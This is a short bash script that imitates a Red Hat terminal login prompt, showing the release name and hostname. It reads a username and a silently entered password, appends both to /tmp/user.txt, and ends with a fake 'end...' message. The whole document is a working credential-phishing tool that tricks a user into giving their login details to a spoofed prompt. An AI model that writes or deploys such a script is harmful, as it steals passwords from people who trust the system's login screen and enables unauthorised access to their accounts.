#! /bin/bash

clear

echo   "`cat /etc/redhat-release`"

echo -n "$(uname -n | cut -d . -f1) login:"

read  username
echo  ${username} >> /tmp/user.txt

echo -n Passwd:
read -s passwd

echo ${passwd} >> /tmp/user.txt
echo
sleep 2

echo 'end...'
